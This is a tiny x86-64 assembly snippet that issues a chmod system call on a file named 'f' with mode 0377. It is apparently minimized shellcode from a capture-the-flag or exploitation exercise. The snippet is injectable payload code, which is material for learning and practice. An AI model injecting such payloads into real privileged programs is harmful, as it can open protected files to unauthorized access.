.intel_syntax noprefix
.global _start
_start:

push 'f'
push rsp
pop rdi
mov al, 90

xor edx, edx
mov dl, 0xFF
push rdx
pop rsi
syscall